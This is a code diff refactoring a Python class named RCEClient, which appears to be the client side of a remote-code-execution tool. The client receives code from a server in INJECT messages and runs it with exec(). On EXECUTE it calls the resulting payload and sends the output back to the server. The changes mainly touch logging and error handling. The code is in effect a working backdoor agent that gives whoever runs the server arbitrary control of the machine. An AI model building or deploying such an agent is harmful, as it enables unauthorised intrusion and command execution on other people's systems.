@@ -34,19 +34,16 @@ class RCEClient(BaseClientThread):
                     raise OSError("RECEIVED DISCONNECT")
 
                 if message.is_type(MessageType.ECHO):
-                    self.__logger.debug(f"Received echo from {message.get_sender()}:\n\t{message}")
                     self.__logger.info(message.data.decode())
                     self.send_message(message)
-                elif message.is_type(MessageType.FILE):
-                    self.__logger.debug(f"Received file from {message.get_sender()}:\n\t{message}")
                 elif message.is_type(MessageType.INJECT):
-                    self.__logger.debug(f"Received inject from {message.get_sender()}:\n\t{message}")
+                    self.__logger.debug(f"inject from {message.get_sender()}:\n\t{message}")
                     self.inject_payload(message)
                 elif message.is_type(MessageType.EXECUTE):
-                    self.__logger.debug(f"Received execute from {message.get_sender()}:\n\t{message}")
+                    self.__logger.debug(f"execute from {message.get_sender()}:\n\t{message}")
                     self.execute_payload()
                 elif message.is_type(MessageType.ERROR):
-                    self.__logger.debug(f"Received error from {message.get_sender()}:\n\t{message}")
+                    self.__logger.debug(f"error from {message.get_sender()}:\n\t{message}")
                 else:
                     self.__logger.debug(f"Unknown message type from {message.get_sender()}: {message.get_type()}")
             except OSError as e:
@@ -73,8 +70,8 @@ class RCEClient(BaseClientThread):
 
         :param message: The message containing the payload to be injected.
         """
-        received_payload = message.data.decode()
-        self.__logger.debug("Injecting payload:\n" + received_payload)
+        received_payload = message.data
+        self.__logger.debug("Injecting payload:\n" + received_payload.decode())
         exec(received_payload, locals(), globals())
         setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))
         self.__logger.debug("Injected payload")
@@ -83,14 +80,12 @@ class RCEClient(BaseClientThread):
     def execute_payload(self):
         """
         Executes the payload and sends its output back to the server.
+        :raises: OSError: If an error occurs while sending the output back to the server.
         """
-        if output := self.payload():
-            output = str(output)
-            output_bytes = bytes(output, 'utf-8')
-            self.__logger.debug(f"Output from payload execution:\n{output}")
+        if not (output := self.payload()):
+            return
 
-            try:
-                message = Message(message_type=MessageType.ECHO, data=output_bytes)
-                self.send_message(message)
-            except OSError as e:
-                self.__logger.error(e)
+        output = str(output)
+        self.__logger.debug(f"Output from payload execution:\n{output}")
+        message = Message(message_type=MessageType.ECHO, data=output.encode())
+        self.send_message(message)
